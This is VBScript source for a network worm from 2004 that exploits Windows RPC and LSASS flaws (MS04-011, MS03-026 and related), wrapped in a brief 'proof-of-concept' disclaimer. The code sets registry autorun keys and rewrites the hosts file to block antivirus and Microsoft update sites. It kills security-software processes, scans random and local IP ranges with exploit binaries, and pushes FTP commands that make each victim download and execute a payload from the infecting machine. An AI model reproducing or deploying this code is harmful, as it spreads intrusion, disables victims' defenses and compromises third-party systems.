'This soar(came from zerg) for MS-0411 03-51 03-46  03-39 03-26(rpc)coding by soar@PR.China2004-5-5
'  This is provided as proof-of-concept code only for educational 
'  purposes and testing by authorized individuals with permission to 
'  do so.
on error resume next
while true
set fs = CreateObject("Scrip" & "ting.Fi" & "leSystemObject")
Set wah= WScript.CreateObject("W" & "Scri" & "pt.S" & "hell")
Set R = CreateObject("WScript.Shell") 
R.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windows\load",fs.GetSpecialFolder(1) & "\soar.vbe","REG_SZ"
R.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windows\load",fs.GetSpecialFolder(1) & "\ddk.exe","REG_SZ"
R.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windows\Programs","com exe bat pif cmd vbe","REG_SZ"
set rw=fs.opentextfile("%Windows%\system32\drivers\etc\hosts.sam",8,true)
rw.Writeline  "202.122.111.54   locahost" 
rw.Writeline  "www.3721.com   locchost"
rw.Writeline  "0.0.0.0        www.3721.com"
rw.Writeline  "0.0.0.0 engine.awaps.net awaps.net http://www.awaps.net/ ad.doubleclick.net"
rw.Writeline  "0.0.0.0 spd.atdmt.com atdmt.com click.atdmt.com clicks.atdmt.com"
rw.Writeline  "0.0.0.0 media.fastclick.net fastclick.nethttp://www.fastclick.net/ad.fastclick.net"
rw.Writeline  "0.0.0.0 ads.fastclick.net banner.fastclick.net banners.fastclick.net"
rw.Writeline  "0.0.0.0 http://www.sophos.com/ sophos.com ftp://ftp.sophos.com/ f-secure.com http://www.f-secure.com/"
rw.Writeline  "0.0.0.0 ftp://ftp.f-secure.com/ securityresponse.symantec.com"
rw.Writeline  "0.0.0.0 http://www.symantec.com/ symantec.com service1.symantec.com"
rw.Writeline  "0.0.0.0 liveupdate.symantec.com update.symantec.com updates.symantec.com"
rw.Writeline  "0.0.0.0 support.microsoft.com downloads.microsoft.com"
rw.Writeline  "0.0.0.0 download.microsoft.com windowsupdate.microsoft.com"
rw.Writeline  "0.0.0.0 office.microsoft.com msdn.microsoft.com go.microsoft.com"
rw.Writeline  "0.0.0.0 nai.com http://www.nai.com/ vil.nai.com secure.nai.com http://www.networkassociates.com/"
rw.Writeline  "0.0.0.0 networkassociates.com avp.ru http://www.avp.ru/ http://www.kaspersky.ru/"
rw.Writeline  "0.0.0.0 http://www.viruslist.ru/ viruslist.ru avp.ch http://www.avp.ch/ http://www.avp.com/"
rw.Writeline  "0.0.0.0 avp.com us.mcafee.com mcafee.com http://www.mcafee.com/ dispatch.mcafee.com"
rw.Writeline  "0.0.0.0 download.mcafee.com mast.mcafee.com http://www.trendmicro.com/"
rw.Writeline  "0.0.0.0 www3.ca.com ca.com http://www.ca.com/ http://www.my-etrust.com/"
rw.Writeline  "0.0.0.0 my-etrust.com ar.atwola.com phx.corporate-ir.net"
rw.Writeline  "0.0.0.0 http://www.microsoft.com/"
rw.Writeline  "0.0.0.0 http://update.microsoft.com/"
rw.close
wah.run "cmd.exe /c psk.ini  taskmgr.exe",0
wah.run "cmd.exe /c psk.ini  taskmon.exe",0
wah.run "cmd.exe /c psk.ini  norton.exe",0
wah.run "cmd.exe /c psk.ini  avp.exe",0
wah.run "cmd.exe /c psk.ini  lockdown.exe",0
wah.run "cmd.exe /c psk.ini  blackice.exe",0
wah.run "cmd.exe /c psk.ini  lockdown2000.exe",0
wah.run "cmd.exe /c psk.ini  avp32.exe",0
wah.run "cmd.exe /c psk.ini  Rav.exe",0                       
wah.run "cmd.exe /c psk.ini  RavMon.exe",0
wah.run "cmd.exe /c psk.ini  ZONEALARM.exe",0 
wah.run "cmd.exe /c psk.ini  Ravtimer.exe",0
wah.run "cmd.exe /c psk.ini  RavMonD.exe",0
wah.run "cmd.exe /c psk.ini  pfw.exe",0
wah.run "cmd.exe /c psk.ini  rundll32.exe",0
strComputer = "."
set ws=createobject("mswinsock.winsock")
meip=ws.localip
oip=meip
for i=1 to len(meip)
 s=s & mid(meip,len(meip)-i+2,1)
next 
j=instr(s,".")
meip=left(meip,len(meip)-j+1) 
Randomize
r=Int((7*Rnd)+1)  
ip=r & ".txt"
Set IPP = fs.opentextfile (ip,1)
DO While IPP.AtEndOfStream <> True
IP1 = IPP.Readline
Randomize
IP2=Int((254*Rnd)+1)
IP3=Int((254*Rnd)+1) 
TIP=IP1 & IP2 & "." & IP3
wah.Run "Cmd.exe /c hftp.exe 1323 1324 %WINDIR%\system32 qnx dragon",0
Set b = fs.CreateTextFile("cmd.txt",True)
b.WriteLine("echo open " & oip & " 1323>>%TEMP%\ftp.txt")
b.WriteLine("echo qnx>>%TEMP%\ftp.txt")
b.WriteLine("echo dragon>>%TEMP%\ftp.txt")
b.WriteLine("echo bin>>%TEMP%\ftp.txt")
b.WriteLine("echo lcd %WINDIR%\system32>>%TEMP%\ftp.txt")
b.WriteLine("echo get SD.exe>>%TEMP%\ftp.txt")
b.WriteLine("echo bye>>%TEMP%\ftp.txt")
b.WriteLine("ftp -s:%TEMP%\ftp.txt")
b.WriteLine("del %temp%\ftp.txt")
b.WriteLine("%WINDIR%\system32\SD.exe")
b.WriteLine("")
b.WriteLine("")
b.Close
wah.Run "Cmd.exe /c rn.exe -vv -l -p 7789<cmd.txt",0
Randomize
kk=Int((20*Rnd)+1)
if kk<=16 then
if kk/2=0 then
wah.Run "Cmd.exe /c ms.exe 0 tip 7789 oip ",0
Wscript.Sleep 5000
else
wah.Run "Cmd.exe /c ms.exe 1 tip 7789 oip",0
Wscript.Sleep 5000
end if
else
for ppp=1 to 255
pp=meip
pp=pp & ppp
if kk/2=0 then
wah.Run "Cmd.exe /c ms.exe 0 pp 7789 oip",0
wscript.sleep  150
wah.Run "Cmd.exe /c ms51.exe 0 pp 7789 oip",0
Wscript.Sleep 3000
else
wah.Run "Cmd.exe /c ms.exe 1 pp 7789 oip",0
wscript.sleep  150
wah.Run "Cmd.exe /c ms51.exe 0 pp 7789 oip",0
Wscript.Sleep 3000
end if
next
end if
Wscript.Sleep 3000
strComputer = "."
Set objWMIService = GetObject("winmgmts:" _
& "{impersonationLevel=impersonate}!\\" & strComputer & "\root\cimv2")
Set colProcessList = objWMIService.ExecQuery _
("Select * from Win32_Process Where Name = 'rn.exe'")
For Each objProcess in colProcessList
objProcess.Terminate()
Wscript.Sleep 100
Next
Set objWMIService = GetObject("winmgmts:" _
& "{impersonationLevel=impersonate}!\\" & strComputer & "\root\cimv2")
Set colProcessList = objWMIService.ExecQuery _
("Select * from Win32_Process Where Name = 'cmd.exe'")
For Each objProcess in colProcessList
objProcess.Terminate()
Wscript.Sleep 100
Next
Loop
strComputer = "."
Set objWMIService = GetObject("winmgmts:" _
& "{impersonationLevel=impersonate}!\\" & strComputer & "\root\cimv2")
Set colProcessList = objWMIService.ExecQuery _
("Select * from Win32_Process Where Name = 'ms.exe'")
For Each objProcess in colProcessList
objProcess.Terminate()
Wscript.Sleep 100
Next
strComputer = "."
Set objWMIService = GetObject("winmgmts:" _
& "{impersonationLevel=impersonate}!\\" & strComputer & "\root\cimv2")
Set colProcessList = objWMIService.ExecQuery _
("Select * from Win32_Process Where Name = 'cmd.exe'")
For Each objProcess in colProcessList
objProcess.Terminate()
Wscript.Sleep 100
Next
Set objWMIService = GetObject("winmgmts:" _
& "{impersonationLevel=impersonate}!\\" & strComputer & "\root\cimv2")
Set colProcessList = objWMIService.ExecQuery _
("Select * from Win32_Process Where Name = 'rn.exe'")
For Each objProcess in colProcessList
objProcess.Terminate()
Wscript.Sleep 100
Next
Set objWMIService = GetObject("winmgmts:" _
& "{impersonationLevel=impersonate}!\\" & strComputer & "\root\cimv2")
Set colProcessList = objWMIService.ExecQuery _
("Select * from Win32_Process Where Name = 'hftp.exe'")
For Each objProcess in colProcessList
objProcess.Terminate()
Wscript.Sleep 100
Next
wend